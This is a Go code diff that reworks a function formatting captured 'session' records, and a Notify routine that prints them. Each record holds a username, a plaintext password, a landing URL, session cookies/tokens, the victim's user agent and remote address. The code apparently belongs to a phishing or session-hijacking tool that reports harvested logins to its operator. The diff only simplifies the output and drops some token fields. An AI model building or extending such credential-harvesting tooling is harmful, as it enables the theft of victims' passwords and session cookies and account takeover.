@@ -7,39 +7,26 @@ import (
 
 func formatSessionMessage(session Session) string {
 	tokensJSON, _ := json.MarshalIndent(session.Tokens, "", "  ")
-	httpTokensJSON, _ := json.MarshalIndent(session.HTTPTokens, "", "  ")
-	bodyTokensJSON, _ := json.MarshalIndent(session.BodyTokens, "", "  ")
-	customJSON, _ := json.MarshalIndent(session.Custom, "", "  ")
 
-	return fmt.Sprintf("✨ **Session Information** ✨\n\n"+
-		"👤 Username:      ➖ %s\n"+
-		"🔑 Password:      ➖ %s\n"+
-		"🌐 Landing URL:   ➖ %s\n \n"+
+	return fmt.Sprintf("**Session Information**\n\n"+
+		"Username:      ➖ %s\n"+
+		"Password:      ➖ %s\n"+
+		"Landing URL:   ➖ %s\n \n"+
 
-		"🆔 Tokens:        ➖ \n ``` \n [ %s ] \n ``` \n "+
-		"🆔 HTTPTokens:    ➖ \n ``` \n [ %s ] \n ``` \n "+
-		"🆔 BodyTokens:    ➖ \n ``` \n [ %s ] \n ``` \n "+
-		"🆔 Custom:        ➖ \n ``` \n [ %s ] \n ``` \n "+
-		"🆔 Session ID:    ➖ \n ``` \n [ %s ] \n ``` \n \n"+
+		"Cookies:        ➖ \n ``` \n [ %s ] \n ``` \n "+
+		"Session ID:    ➖ \n ``` \n [ %s ] \n ``` \n \n"+
 
-		"🖥️ User Agent:    ➖ %s\n"+
-		"🌍 Remote Address:➖ %s\n"+
-		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n",
+		"User Agent:    ➖ %s\n"+
+		"Remote Address:➖ %s\n"+
+		"Create Time:   ➖ %d\n",
 		session.Username,
 		session.Password,
 		session.LandingURL,
-
 		string(tokensJSON), // Printing formatted JSON strings
-		string(httpTokensJSON),
-		string(bodyTokensJSON),
-		string(customJSON),
-
 		session.SessionID,
 		session.UserAgent,
 		session.RemoteAddr,
 		session.CreateTime,
-		session.UpdateTime,
 	)
 }
 
@@ -50,7 +37,7 @@ func Notify(session Session) {
 	}
 	message := formatSessionMessage(session)
 	fmt.Printf("------------------------------------------------------\n")
-	fmt.Printf("Latest Session:\n")
+	fmt.Printf("Session:\n")
 	fmt.Printf(message)
 	fmt.Printf("------------------------------------------------------\n")
 
